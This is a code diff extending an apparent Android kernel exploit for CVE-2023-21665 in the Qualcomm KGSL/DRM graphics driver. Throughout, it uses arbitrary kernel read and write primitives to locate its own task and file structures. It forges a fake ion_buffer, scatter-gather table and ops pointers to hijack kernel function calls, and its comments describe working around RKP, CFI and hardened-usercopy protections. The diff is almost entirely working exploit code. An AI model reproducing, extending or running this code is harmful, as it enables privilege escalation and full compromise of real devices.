@@ -21,6 +21,8 @@ struct kgsl_map_user_mem {
 #define DRM_IOCTL_MAP_DUMB_     _IOWR('d', 0xb3, struct drm_mode_map_dumb)
 #define DRM_IOCTL_PRIME_HANDLE_TO_FD_ _IOWR('d', 0x2d, struct drm_prime_handle)
 #define IOCTL_KGSL_MAP_USER_MEM_ _IOWR(0x09, 0x15, struct kgsl_map_user_mem)
+struct ion_allocation_data { uint64_t len; uint32_t heap_id_mask, flags, fd, unused; };
+#define ION_IOC_ALLOC_ _IOWR('I', 0, struct ion_allocation_data)
 
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
@@ -1126,6 +1128,73 @@ int try_cfi_stage(void) {
         fsync(1);
       }
 
+      /* KGSL_IONPROBE=1: allocate a real ion buffer and dump struct ion_buffer
+       * so we can confirm its field offsets on this kernel before faking one. */
+      {
+        const char *ip = getenv("KGSL_IONPROBE");
+        if (ip && *ip) {
+          /* NOTE: repointing our own cred is caught by RKP (CRED PROTECTION
+           * VIOLATION); /dev/ion is 0664 system:system so this open just fails
+           * with EACCES as uid 2000.  Kept only as a shape check. */
+          struct ion_allocation_data ia;
+          memset(&ia, 0, sizeof ia);
+          ia.len = 0x4000; ia.heap_id_mask = 0xffffffffu;
+          int ifd = open("/dev/ion", O_RDWR);
+          pr_info("ionprobe: open=%d errno=%d\n", ifd, errno); fsync(1);
+          if (ifd >= 0) {
+            int ra = ioctl(ifd, ION_IOC_ALLOC_, &ia);
+            pr_info("ionprobe: alloc ret=%d fd=%u errno=%d\n", ra, ia.fd, errno); fsync(1);
+            if (ra == 0 && ia.fd) {
+              uint32_t me = (uint32_t)getpid();
+              uintptr_t head = data_addr(INIT_TASK_TASKS);
+              uintptr_t canon = canon_addr(INIT_TASK_TASKS);
+              uint64_t entry = 0; uintptr_t task = 0;
+              configfs_read_once(fd, head, &entry, sizeof entry);
+              for (int i = 0; i < 8192; i++) {
+                if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
+                if (!is_direct_ptr(entry)) break;
+                uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
+                uint32_t pid = 0;
+                configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof pid);
+                if (pid == me) { task = t; break; }
+                if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof entry)
+                    != (ssize_t)sizeof entry) break;
+              }
+              uint64_t P2 = 0, fdt2 = 0, fda2 = 0, file2 = 0, dbuf2 = 0, ops2 = 0, ibuf = 0;
+              if (is_direct_ptr(task)) {
+                configfs_read_once(fd, task + 0x880, &P2, 8);
+                if (is_direct_ptr(P2)) configfs_read_once(fd, P2 + 0x20, &fdt2, 8);
+                if (is_direct_ptr(fdt2)) configfs_read_once(fd, fdt2 + 0x8, &fda2, 8);
+                if (is_direct_ptr(fda2)) configfs_read_once(fd, fda2 + (uint64_t)ia.fd * 8, &file2, 8);
+                if (is_direct_ptr(file2)) configfs_read_once(fd, file2 + 0xd0, &dbuf2, 8);
+                if (is_direct_ptr(dbuf2)) {
+                  configfs_read_once(fd, dbuf2 + 0x20, &ops2, 8);
+                  configfs_read_once(fd, dbuf2 + 0x98, &ibuf, 8);
+                }
+              }
+              pr_info("ionprobe: task=%016zx fda=%016zx file=%016zx dbuf=%016zx ops=%016zx ibuf=%016zx\n",
+                      (size_t)task, (size_t)fda2, (size_t)file2, (size_t)dbuf2,
+                      (size_t)ops2, (size_t)ibuf);
+              if (is_direct_ptr(ibuf)) {
+                for (int k = 0; k < 6; k++) {
+                  uint64_t q[4] = {0};
+                  configfs_read_once(fd, ibuf + k * 0x20, q, sizeof q);
+                  pr_info("ionprobe: ib+%02x = %016zx %016zx %016zx %016zx\n",
+                          k * 0x20, (size_t)q[0], (size_t)q[1], (size_t)q[2], (size_t)q[3]);
+                }
+              }
+              fsync(1);
+            }
+          }
+        }
+      }
+
+      /* NOTE: do not add a "dump kernel .text" helper here - with
+       * CONFIG_HARDENED_USERCOPY=y a copy_to_user() from .text hits
+       * "kernel BUG at mm/usercopy.c:72" (report_usercopy) and panics.  Offsets
+       * were instead read off the crash PC dumps (see docs/KGSL_CVE_2023_21665.md).
+       */
+
       /* In-process CVE-2023-21665 weaponisation test (KGSL_DRM=1):
        * open /dev/dri/renderD128 (permitted now that SELinux is permissive),
        * create a GEM + writable MAP_SHARED (-> vma->vm_file->private_data is a
@@ -1180,7 +1249,7 @@ int try_cfi_stage(void) {
                 pr_info("kgsl_drm: task=%016zx dfd=%d files=%016zx fdt=%016zx fdarr=%016zx file=%016zx priv=%016zx\n",
                         (size_t)task, dfd, (size_t)P, (size_t)fdt, (size_t)fdarr,
                         (size_t)file, (size_t)priv);
-                uint64_t qorig[8] = {0};
+                uint64_t qorig[64] = {0};
                 uintptr_t A_saved = 0;
                 if (is_direct_ptr(priv)) {
                   uintptr_t A = (uintptr_t)priv;
@@ -1192,10 +1261,54 @@ int try_cfi_stage(void) {
                   configfs_write_once(fd, A + 24, &self, 8);
                   configfs_write_once(fd, A + 40, &z, 8);
                   for (int k = 0; k < 16; k++) configfs_write_once(fd, ot + k * 8, &z, 8);
-                  uint64_t mapf = (uint64_t)data_addr(DRM_GEM_MAP_DMA_BUF);
-                  configfs_write_once(fd, ot + 0x10, &mapf, 8);
+                  const char *sgt = getenv("KGSL_SGT");
+                  if (sgt && *sgt) {
+                    /* The shipped 4.14.190 kernel's ion_dma_buf_attach does:
+                     *   ldr x25,[dmabuf,#0xa0]   (buffer = dmabuf->priv)
+                     *   ldr x26,[x25,#0x80]      (buffer->sg_table)
+                     * so make the fake ion_buffer satisfy every plausible offset:
+                     * priv at 0x98 *and* 0xa0, sg_table at 0x70/0x78/0x80,
+                     * attachments self-linked at 0x88/0x90. */
+                    uint64_t vs = (uint64_t)VMEMMAP_START;   /* arm64: fixed vmemmap base */
+                    uintptr_t FB = A + 0x100, GT = A + 0x1A0, SL = A + 0x1B0;
+                    for (int k = 0; k < 20; k++) configfs_write_once(fd, FB + k * 8, &z, 8);
+                    configfs_write_once(fd, FB + 0x70, &GT, 8);       /* sg_table? */
+                    configfs_write_once(fd, FB + 0x78, &GT, 8);       /* sg_table? */
+                    configfs_write_once(fd, FB + 0x80, &GT, 8);       /* sg_table? (or att.next) */
+                    uint64_t fbself = (uint64_t)(FB + 0x88);
+                    configfs_write_once(fd, FB + 0x88, &fbself, 8);   /* attachments */
+                    configfs_write_once(fd, FB + 0x90, &fbself, 8);   /* attachments */
+                    configfs_write_once(fd, GT + 0x00, &SL, 8);       /* sg_table.sgl */
+                    uint32_t one = 1;
+                    configfs_write_once(fd, GT + 0x08, &one, 4);      /* nents */
+                    configfs_write_once(fd, GT + 0x0c, &one, 4);      /* orig_nents */
+                    /* struct page* of the victim object's own (slab) page.
+                     * arm64: virt_to_page(k) = VMEMMAP_START |
+                     *   ((k & ~PAGE_OFFSET)/PAGE_SIZE*sizeof(struct page)),
+                     * i.e. page = VMEMMAP_START + ((A-PAGE_OFFSET)>>12)*0x40. */
+                    uint64_t pfn = ((uint64_t)A - (uint64_t)P0_PAGE_OFFSET) >> 12;
+                    uint64_t page = vs + pfn * 0x40;
+                    uint64_t pl = page | 2;                          /* |SG_END */
+                    uint32_t ofs = 0, len = 0x1000; uint64_t da = 0; uint32_t dl = 0;
+                    configfs_write_once(fd, SL + 0x00, &pl, 8);
+                    configfs_write_once(fd, SL + 0x08, &ofs, 4);
+                    configfs_write_once(fd, SL + 0x0c, &len, 4);
+                    configfs_write_once(fd, SL + 0x10, &da, 8);
+                    configfs_write_once(fd, SL + 0x18, &dl, 4);
+                    configfs_write_once(fd, A + 0x98, &FB, 8);    /* dma_buf.priv? */
+                    configfs_write_once(fd, A + 0xa0, &FB, 8);    /* dma_buf.priv? */
+                    uint64_t ia = (uint64_t)data_addr(ION_DMA_BUF_ATTACH);
+                    uint64_t im = (uint64_t)data_addr(ION_MAP_DMA_BUF);
+                    configfs_write_once(fd, ot + 0x00, &ia, 8);
+                    configfs_write_once(fd, ot + 0x10, &im, 8);
+                    pr_info("kgsl_drm: SGT page=%016zx page_link=%016zx attach=%016zx map=%016zx\n",
+                            (size_t)page, (size_t)pl, (size_t)ia, (size_t)im);
+                  } else {
+                    uint64_t mapf = (uint64_t)data_addr(DRM_GEM_MAP_DMA_BUF);
+                    configfs_write_once(fd, ot + 0x10, &mapf, 8);
+                    pr_info("kgsl_drm: fake ops.map_dma_buf=%016zx\n", (size_t)mapf);
+                  }
                   configfs_write_once(fd, A + 32, &ot, 8);
-                  pr_info("kgsl_drm: fake ops.map_dma_buf=%016zx\n", (size_t)mapf); fsync(1);
                   uint64_t q[8] = {0};
                   configfs_read_once(fd, A, q, sizeof(q));
                   pr_info("kgsl_drm: patched [%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx]\n",
@@ -1246,7 +1359,7 @@ int try_cfi_stage(void) {
                 }
                 /* restore the victim object so closing the fd doesn't crash */
                 if (A_saved) {
-                  for (int k = 0; k < 8; k++)
+                  for (int k = 0; k < 64; k++)
                     configfs_write_once(fd, A_saved + k * 8, &qorig[k], 8);
                   pr_info("kgsl_drm: restored victim\n"); fsync(1);
                 }
